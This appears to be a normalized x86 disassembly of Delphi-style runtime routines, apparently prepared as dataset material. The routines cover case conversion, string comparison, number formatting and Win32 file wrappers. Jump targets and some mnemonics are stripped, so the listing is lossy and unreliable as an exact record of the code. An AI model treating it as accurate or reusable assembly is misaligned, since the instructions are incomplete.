pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_4079d4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404174
mov ebx eax
mov eax edi
mov edx ebx
call sub_404500
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407a10
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407a40
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407a60
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407ab4
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407a60
test eax eax
jne r-xdata
sub_407ad8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404174
push eax
mov eax esi
call sub_404374
push eax
mov eax ebx
call sub_404174
push eax
mov eax ebx
call sub_404374
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407b10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404174
push eax
mov eax esi
call sub_404374
push eax
mov eax ebx
call sub_404174
push eax
mov eax ebx
call sub_404374
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407b60
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407b80
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_404174
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403eb4
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_4043d4
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407bd0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov edi eax
xor eax eax
push ebp
push sub_407d29
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx edi
mov eax edi
call sub_404174
mov esi eax
add esi ebx
mov eax edi
call sub_404174
mov [ ebp - 0xc ] eax
cmp esi ebx
jbe r-xdata
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_4040ac
mov eax [ ebp - 0x14 ]
call sub_404174
cmp eax [ ebp - 0xc ]
jne r-xdata
mov al [ ebx ]
mov edx eax
sub dl 0xa
je r-xdata
mov ebx edi
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
xor edx edx
call sub_403fa4
mov edi [ ebp - 0x8 ]
mov edi [ edi ]
cmp esi ebx
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov edx edi
call sub_403f08
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
sub dl 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407d30
lea eax [ ebp - 0x14 ]
call sub_403eb4
retn
mov al [ ebx ]
mov edx eax
sub dl 0xa
je r-xdata
inc ebx
inc [ ebp - 0xc ]
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
sub dl 0x3
je r-xdata
cmp [ ebx + 0x1 ] 0xa
jne r-xdata
cmp [ ebx + 0x1 ] 0xa
jne r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov [ edi ] 0xa
inc edi
inc ebx
jmp r-xdata
mov [ edi ] 0xd
inc edi
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
jmp r-xdata
dec [ ebp - 0xc ]
jmp r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
inc ebx
jmp r-xdata
mov eax ebx
call sub_40bf10
mov ebx eax
jmp r-xdata
cmp esi ebx
ja r-xdata
mov [ edi ] 0xa
inc edi
inc ebx
cmp [ ebx ] 0xa
jne r-xdata
mov [ edi ] 0xd
inc edi
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
cmp esi ebx
ja r-xdata
inc ebx
jmp r-xdata
mov al [ ebx ]
mov [ edi ] al
inc edi
inc ebx
mov eax ebx
call sub_40bef0
mov [ ebp - 0x10 ] eax
mov edx edi
mov eax ebx
mov ecx [ ebp - 0x10 ]
call sub_4028c8
add edi [ ebp - 0x10 ]
add ebx [ ebp - 0x10 ]
jmp r-xdata
sub_407d38
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_404174
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_404174
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407d9c
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407db2
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407db2
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407db2
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407de8
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407d9c
mov edx esi
pop eax
call sub_403fa4
add esp 0x10
pop esi
retn
sub_407e08
or cl cl
jne sub_407e3c
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407e3c
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407e3c
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407e3c
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407ed4
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407e08
mov edx esi
pop eax
call sub_403fa4
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_407efc
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407d9c
mov edx esi
pop eax
call sub_403fa4
add esp 0x20
pop esi
retn
xor edx edx
sub_407f24
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b24
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_4078f0
sub_407f78
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b24
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_407f98
mov eax [ rw-data ]
call sub_404c7c
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404c7c
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e38
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f08
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e38
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f08
sub_408028
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407b48
test al al
je r-xdata
sub_408064
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409238
mov edx eax
test dl dl
je r-xdata
call sub_407f98
push ebp
mov eax [ rw-data ]
call sub_404c84
mov edx eax
mov eax [ rw-data ]
call sub_408028
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404c84
mov edx eax
mov eax [ rw-data ]
call sub_408028
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_408100
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f08
call sub_407f98
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f08
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f08
jmp r-xdata
pop esi
pop ebx
retn
sub_40814c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_404374
push eax
call CreateFileA
sub_4081a4
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_404374
push eax
call CreateFileA
pop ebx
retn
sub_4081d0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4081fc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408228
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408268
push ebx
push esi
mov esi eax
mov eax esi
call sub_404174
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40bce0
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408298
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_404174
mov edi eax
mov eax ebx
call sub_404374
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408554
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40bce0
cmp al 0x2
jne r-xdata
dec edi
sub_4082e8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408298
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_4043d4
pop edi
pop esi
pop ebx
retn
sub_408320
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_404374
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_403fa4
add esp 0x108
pop esi
pop ebx
retn
sub_40835c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404c58
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404c58
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_40840c
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408434
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408468
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404174
push eax
mov eax ebx
call sub_404374
mov edx eax
mov eax esi
pop ecx
call sub_408434
pop esi
pop ebx
retn
sub_40848c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404374
mov edx eax
mov ecx edi
mov eax ebx
call sub_408434
pop edi
pop esi
pop ebx
retn
sub_4084ac
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_4084d0
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408510
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408568
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_4085f0
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4083d0
mov esi eax
inc esi
mov eax esi
call sub_4085d0
mov ecx esi
mov edx ebx
call sub_4083fc
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_40862c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40bd04
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_4083fc
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_4078f0
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_4086b4
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408a0b
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408796
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_4087de
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408796
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_4086a8
pop edx
or edx edx
je r-xdata
sub_408796
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408a0b
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4087de
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408a0b
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_40862c
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408805 ]
mov ebx ecx
sub cl 0x44
je sub_407e08
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_4040dc
jmp r-xdata
mov esi sub_40413c
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407e08
sub cl 0x44
je sub_407d9c
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407d9c
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407e08
mov ecx 0x10
cmp bl 0x58
je sub_407d9c
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408684
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408bc4
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407d9c
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408a2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4083d0
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_4086b4
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408a6c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4083d0
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_4086b4
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408ac0
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_404174
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404174
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_404174
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_4086b4
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_403fa4
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403eb4
mov eax esi
mov edx ebx
call sub_404500
mov eax [ ebp - 0x4 ]
call sub_404174
push eax
mov eax [ ebp - 0x8 ]
push eax
